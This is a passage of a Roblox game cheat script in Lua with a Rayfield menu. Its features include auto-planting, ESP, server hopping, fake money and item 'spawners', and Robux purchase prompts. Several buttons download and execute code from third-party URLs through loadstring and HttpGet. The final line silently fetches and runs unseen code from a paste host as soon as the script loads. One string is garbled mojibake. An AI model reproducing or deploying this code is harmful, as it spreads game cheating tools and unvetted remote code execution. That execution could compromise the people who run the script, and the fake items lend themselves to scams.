MiscTab:CreateToggle({ Name = "Auto Plant", Info = "Fly and No Clip recommended to avoid glitches from growing crops", CurrentValue = false, Callback = function(state) AutoPlanting = state if state then startAutoPlanting() end end })

MiscTab:CreateSection("Extras")
MiscTab:CreateButton({ Name = "AntiAfk (Press Once Only)", Callback = function() local success, error = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))() end) Rayfield:Notify({ Title = success and "Anti Afk" or "Error", Content = success and "Anti Afk script executed successfully!" or "Failed to execute Anti Afk script: " .. tostring(error), Duration = 5, Image = success and "rewind" or "alert-triangle" }) end })
MiscTab:CreateButton({ Name = "ServerHop", Callback = function() local success, error = pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Spectrum-Trash/Addons/refs/heads/main/FindServer.lua"))() end) Rayfield:Notify({ Title = success and "Server Finder" or "Error", Content = success and "Server Finder script executed successfully!" or "Failed to execute Server Finder script: " .. tostring(error), Duration = 5, Image = success and "rewind" or "alert-triangle" }) end })
MiscTab:CreateButton({ Name = "ServerHop V2", Callback = ServerHop })
MiscTab:CreateSection("Purchase Stuff (if it gave you the item dm me please)")
MiscTab:CreateButton({ Name = "Buy Candy Blossom With Robux", Info = "Click to purchase", Callback = function() local MarketplaceService = game:GetService("MarketplaceService") pcall(function() MarketplaceService:PromptProductPurchase(lp, ProductId) end) end })
MiscTab:CreateButton({ Name = "Buy Bug Egg", Info = "Click to purchase", Callback = function() local MarketplaceService = game:GetService("MarketplaceService") pcall(function() MarketplaceService:PromptProductPurchase(lp, 3277000452) end) end })

SpawnerTab:CreateLabel("Credits to @dzxbin")
SpawnerTab:CreateLabel("This is just Visual. It's not real")
SpawnerTab:CreateSection("Seed Spawner")
SpawnerTab:CreateInput({Name="Seed Name (Without the Seed for example Candy Blossom)",PlaceholderText="Name",RemoveTextAfterFocusLost=false,Callback=function(t)seedName=t end})
SpawnerTab:CreateInput({Name="Quanity",PlaceholderText="Amount",RemoveTextAfterFocusLost=false,Callback=function(t)seedAmount=tonumber(t)or 0 end})
SpawnerTab:CreateButton({Name="Spawn Seeds",Callback=function()if seedName==""or seedAmount<=0 then return end local m=game:GetService("ReplicatedStorage"):FindFirstChild("Seed_Models"):FindFirstChild(seedName)if not m then warn("no model:",seedName)return end local t=Instance.new("Tool")t.Name=seedName.." Seed [x"..seedAmount.."]"t.RequiresHandle=true local c=m:Clone()local h=c:IsA("Part")and c or c:FindFirstChildWhichIsA("Part")if not h then warn("no handle lololol")return end h.Name="Handle"h.Anchored=false h.CanCollide=false h.Massless=true h.Parent=t t.Grip=CFrame.new(0.2,-0.449,0.232)*CFrame.Angles(0,math.rad(0),0)t.Parent=game.Players.LocalPlayer.Backpack end})
SpawnerTab:CreateSection("Pet Spawner")
makeInput(SpawnerTab, "Pet name", "e.g., Raccoon", function(t) PetName = t end)
makeInput(SpawnerTab, "Pet Weight", "e.g., 2", function(t) PetWeight = t end)
makeInput(SpawnerTab, "Pet Age", "e.g., 3", function(t) PetAge = t end)

SpawnerTab:CreateButton({
    Name = "Spawn Pet",
    Callback = function()
        local player = Players.LocalPlayer
        local backpack = player:WaitForChild("Backpack")
        local RS = game:GetService("ReplicatedStorage")
        local Models = RS:WaitForChild("Assets"):WaitForChild("Models"):WaitForChild("PetAssets")
        local Anims = RS:WaitForChild("Assets"):WaitForChild("Animations"):WaitForChild("PetAnimations")

        local petModel = Models:FindFirstChild(PetName)
        if not petModel then
            return warn("Pet not found: " .. PetName)
        end

        local pet = petModel:Clone()
        local root = pet:FindFirstChild("RootPart")
        if not root then
            return warn("No RootPart found in pet model")
        end

        root.Name = "Handle"
        pet.PrimaryPart = root

        local weight = tonumber(PetWeight) or 1
        pet:ScaleTo(1 + 0.05 * (weight / 0.5) + (weight - math.floor(weight)))

        local tool = Instance.new("Tool")
        tool.Name = ("%s\n[%s KG]\n[Age %s]"):format(PetName, PetWeight, PetAge)
        tool.RequiresHandle = true

        if PetName:lower() == "dragonfly" then
            tool.Grip = CFrame.new(0, -3, 0) * CFrame.Angles(math.rad(90), 0, 29.7)
        else
            tool.Grip = CFrame.Angles(math.rad(90), 0, math.rad(-90))
        end

        tool.Parent = backpack

        for _, part in ipairs(pet:GetChildren()) do
            part.Parent = tool
        end
        pet:Destroy()

        tool.Equipped:Connect(function()
            local animCtrl = tool:FindFirstChildWhichIsA("AnimationController", true)
                or Instance.new("AnimationController", tool)
            animCtrl.Name = PetName .. "Controller"

            local animator = animCtrl:FindFirstChildOfClass("Animator") or Instance.new("Animator", animCtrl)
            local animName = ({["fox"] = true, ["red fox"] = true})[PetName:lower()] and "Fox" or PetName
            local folder = Anims:FindFirstChild(animName)

            if folder and folder:FindFirstChild("Idle") then
                local anim = Instance.new("Animation", tool)
                anim.AnimationId = folder.Idle.AnimationId
                local track = animator:LoadAnimation(anim)
                track.Looped = true
                track:Play()
            else
                warn("No idle animation found for: " .. animName)
            end
        end)
    end
})

SpawnerTab:CreateSection("Tree Spawner")
local Players    = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace  = game:GetService("Workspace")
local mouse      = Players.LocalPlayer:GetMouse()

-- Helper: force studs on every face
local function applyStudSurfaces(model)
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            part.TopSurface    = Enum.SurfaceType.Studs
            part.BottomSurface = Enum.SurfaceType.Studs
            part.FrontSurface  = Enum.SurfaceType.Studs
            part.BackSurface   = Enum.SurfaceType.Studs
            part.LeftSurface   = Enum.SurfaceType.Studs
            part.RightSurface  = Enum.SurfaceType.Studs
        end
    end
end

local selectedModel = "Candy Blossom"
local selectedSize  = 0

local urlMap = {
    ["Candy Blossom"] = {
        url  = "https://raw.githubusercontent.com/pastebinaccount/cbloss/refs/heads/main/cb",
        name = "Candy Blossom"
    },
    ["Moon Blossom"] = {
        url  = "https://raw.githubusercontent.com/pastebinaccount/mbloss/refs/heads/main/mb",
        name = "Moon Blossom"
    }
}

SpawnerTab:CreateInput({
    Name                    = "Size ?",
    PlaceholderText         = "Extra studs to add",
    RemoveTextAfterFocusLost= false,
    Callback                = function(text)
        selectedSize = tonumber(text) or 0
    end
})

SpawnerTab:CreateDropdown({
    Name          = "Pick Blossom Model",
    Options       = {"Candy Blossom", "Moon Blossom"},
    CurrentOption = "Candy Blossom",
    Callback      = function(option)
        if typeof(option) == "table" then
            if #option >= 1 then
                selectedModel = option[1]
            elseif option.Name then
                selectedModel = option.Name
            else
                selectedModel = tostring(option)
            end
        else
            selectedModel = tostring(option)
        end
        warn("[DEBUG] selectedModel =", selectedModel)
    end
})

SpawnerTab:CreateButton({
    Name     = "Spawn Selected Blossom",
    Callback = function()
        local info = urlMap[selectedModel]
        if not info then
            warn("Invalid model selection: " .. tostring(selectedModel))
            return
        end

        local ok, err = pcall(function()
            loadstring(game:HttpGet(info.url))()
        end)
        if not ok then
            warn("Failed to load model from URL:", info.url, err)
            return
        end

        local original
        for i = 1, 25 do
            original = Workspace:FindFirstChild(info.name)
            if original then break end
            task.wait(0.2)
        end
        if not original or not original:IsA("Model") then
            warn("Model '" .. info.name .. "' not found.")
            return
        end

        if Workspace:FindFirstChild("BlossomPreview") then
            Workspace.BlossomPreview:Destroy()
        end

        local preview = original:Clone()
        preview.Name = "BlossomPreview"
        preview:PivotTo(CFrame.new(0,0,0))
        applyStudSurfaces(preview)
        preview.Parent = Workspace

        local lowestY = math.huge
        for _, part in ipairs(preview:GetDescendants()) do
            if part:IsA("BasePart") then
                local bottom = part.Position.Y - part.Size.Y/2
                lowestY = math.min(lowestY, bottom)
            end
        end

        local base = Instance.new("Part")
        base.Name        = "TreeBase"
        base.Size        = Vector3.new(1,1,1)
        base.Anchored    = true
        base.CanCollide  = false
        base.Transparency= 1
        base.Color       = Color3.fromRGB(40,127,71)
        base.CFrame      = CFrame.new(0, lowestY, 0)
        base.Parent      = preview

        preview.PrimaryPart = base
        preview:ScaleTo(1 + (selectedSize/10))

        for _, part in ipairs(preview:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored     = true
                part.CanCollide   = false
                part.Material     = Enum.Material.ForceField
                part.Transparency = 0.1
            end
        end

        local moving = true
        local stepConn = RunService.RenderStepped:Connect(function()
            if moving and mouse.Hit then
                local pos = mouse.Hit.Position + Vector3.new(0,20,0)
                preview:SetPrimaryPartCFrame(CFrame.new(pos))
            end
        end)

        local clickConn
        clickConn = mouse.Button1Down:Connect(function()
            moving = false
            stepConn:Disconnect()
            clickConn:Disconnect()

            local final = original:Clone()
            final.Name = info.name
            final:PivotTo(CFrame.new(0,0,0))
            applyStudSurfaces(final)

            local lowestY2 = math.huge
            for _, part in ipairs(final:GetDescendants()) do
                if part:IsA("BasePart") then
                    local bottom = part.Position.Y - part.Size.Y/2
                    lowestY2 = math.min(lowestY2, bottom)
                end
            end

            local finalBase = Instance.new("Part")
            finalBase.Name        = "TreeBase"
            finalBase.Size        = Vector3.new(1,1,1)
            finalBase.Anchored    = true
            finalBase.CanCollide  = false
            finalBase.Transparency= 1
            finalBase.Color       = Color3.fromRGB(40,127,71)
            finalBase.CFrame      = CFrame.new(0, lowestY2, 0)
            finalBase.Parent      = final

            final.PrimaryPart = finalBase
            final:ScaleTo(1 + (selectedSize/10))

            local dropPos = preview.PrimaryPart.Position - Vector3.new(0,21,0)
            local randomYaw = math.rad(math.random(0,360))
            local cf = CFrame.new(dropPos) * CFrame.Angles(0, randomYaw, 0)
            final:SetPrimaryPartCFrame(cf)

            for _, part in ipairs(final:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Anchored   = true
                    part.CanCollide = true
                    part.Material   = Enum.Material.Plastic
                end
            end

            final.Parent = Workspace
            preview:Destroy()
        end)
    end
})

SpawnerTab:CreateLabel("more trees coming in the future :)")

-- Visuals Tab
VisualsTab:CreateSection("ESP")
VisualsTab:CreateDropdown({ Name = "Select Mutations", Options = mutationOptions, CurrentOption = state.selectedMutations, MultipleOptions = true, Flag = "ESPFr", Callback = function(options) state.selectedMutations = options updateESP() end })
VisualsTab:CreateToggle({ Name = "Enable Mutation ESP", CurrentValue = false, Callback = function(value) state.espEnabled = value updateESP() end })
local CountLabel = VisualsTab:CreateLabel("Mutation Stats")
RunService.Heartbeat:Connect(function() CountLabel:Set(updateMutationCounts()) end)
VisualsTab:CreateSection("Mutation Webhook Notifier")

-- UI Setup
VisualsTab:CreateInput({
    Name = "Discord Webhook URL",
    Info = "Enter your Discord webhook URL for mutation notifications",
    PlaceholderText = "https://discord.com/api/webhooks/...",
    Flag = "WebhookInput",
    Callback = function(value)
        state.webhookUrl = value
        if value ~= "" and #state.selectedMutations > 0 then
            checkForMutations() -- Trigger check when webhook is set
        end
    end
})

VisualsTab:CreateDropdown({
    Name = "Select Mutations",
    Options = mutationOptions,
    CurrentOption = state.selectedMutations,
    MultipleOptions = true,
    Flag = "SelectMutts",
    Callback = function(options)
        state.selectedMutations = options
        if #options > 0 and state.webhookUrl ~= "" then
            checkForMutations() -- Trigger check when mutations are updated
        end
    end
})

-- Continuous checking loop
spawn(function()
    while true do
        if #state.selectedMutations > 0 and state.webhookUrl ~= "" then
            checkForMutations()
        end
        wait(5) -- Check every 5 seconds to avoid performance issues
    end
end)
VisualsTab:CreateSection("Visuals")
VisualsTab:CreateButton({ Name = "Remove Other's Plants", Info = "Removes everyone else's plants except yours", Callback = DestroyOthersFarm })
VisualsTab:CreateInput({ Name = "Fake Money", PlaceholderText = "Enter Amount", RemoveTextAfterFocusLost = false, Callback = function(value)
    local amount = tonumber(value)
    if not amount then return end
    if lp and lp:FindFirstChild("leaderstats") and lp.leaderstats:FindFirstChild("Sheckles") then lp.leaderstats.Sheckles.Value = amount end
    local function formatCommas(n)
        local negative = n < 0
        n = tostring(math.abs(n))
        local left, num, right = string.match(n, "^([^%d]*%d)(%d*)(.-)$")
        local formatted = left .. (num:reverse():gsub("(%d%d%d)", "%1,"):reverse()) .. right
        return (negative and "-" or "") .. formatted .. "ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢"
    end
    local function shortenNumber(n)
        local scales = { {1000000000000000000, "Qi"}, {999999986991104, "Qa"}, {999999995904, "T"}, {1000000000, "B"}, {1000000, "M"}, {1000, "K"} }
        local negative = n < 0
        n = math.abs(n)
        if n < 1000 then return (negative and "-" or "") .. tostring(math.floor(n)) end
        for i = 1, #scales do
            local scale, label = scales[i][1], scales[i][2]
            if n >= scale then
                local value = n / scale
                return (negative and "-" or "") .. (value % 1 == 0 and string.format("%.0f%s", value, label) or string.format("%.2f%s", value, label))
            end
        end
        return (negative and "-" or "") .. tostring(n)
    end
    local formattedDealer = formatCommas(amount)
    local formattedBoard = shortenNumber(amount)
    local shecklesUI = lp:FindFirstChild("PlayerGui") and lp.PlayerGui:FindFirstChild("Sheckles_UI")
    if shecklesUI and shecklesUI:FindFirstChild("TextLabel") then shecklesUI.TextLabel.Text = formattedDealer end
    local dealerBoard = workspace:FindFirstChild("DealerBoard")
    if dealerBoard and dealerBoard:FindFirstChild("BillboardGui") and dealerBoard.BillboardGui:FindFirstChild("TextLabel") then dealerBoard.BillboardGui.TextLabel.Text = formattedBoard end
end })
VisualsTab:CreateButton({ Name = "Destroy UI", Callback = function() Rayfield:Destroy() end })

local function getItemPrice(path, item)
    local container = path:FindFirstChild(item)
    if not container then return math.huge end
    local frame = container:FindFirstChild("Frame")
    if not frame then return math.huge end
    local buyBtn = frame:FindFirstChild("Sheckles_Buy")
    if not buyBtn then return math.huge end
    local inStock = buyBtn:FindFirstChild("In_Stock")
    if not inStock then return math.huge end
    local costText = inStock:FindFirstChild("Cost_Text")
    if not costText or not costText.Text then return math.huge end
    return parseMoney(costText.Text)
end

local function tryPurchase(path, remote, item)
    local itemPrice = getItemPrice(path, item)
    local playerMoney = getPlayerMoney()
    if playerMoney >= itemPrice then
        local container = path:FindFirstChild(item)
        if container and container:FindFirstChild("Frame") then
            local buyBtn = container.Frame:FindFirstChild("Sheckles_Buy")
            if buyBtn and buyBtn:FindFirstChild("In_Stock") and buyBtn.In_Stock.Visible then
                remote:FireServer(item)
                return true
            end
        end
    end
    return false
end

-- Cleanup
local function cleanup()
    if descendantConnection then descendantConnection:Disconnect() end
    if collectionThread then task.cancel(collectionThread) end
    for prompt, data in pairs(promptTracker) do
        if prompt:IsA("ProximityPrompt") then
            pcall(function() prompt.RequiresLineOfSight = data.originalRequiresLOS prompt.Exclusivity = data.originalExclusivity end)
        end
    end
end

workspace.Farm.DescendantAdded:Connect(function(descendant)
    if state.espEnabled and descendant:IsA("Model") and descendant.Parent.Name == "Fruits" then
        local plantModel = descendant.Parent.Parent
        local farm = plantModel:FindFirstAncestorOfClass("Model")
        local data = farm and farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Data")
        if data and data:FindFirstChild("Owner") and data.Owner.Value == lp.Name then
            createESP(descendant)
        end
    end
end)
Rayfield:LoadConfiguration()

loadstring(game:HttpGet("https://bin.mudfish.net/r/922-4777-5449", true))()
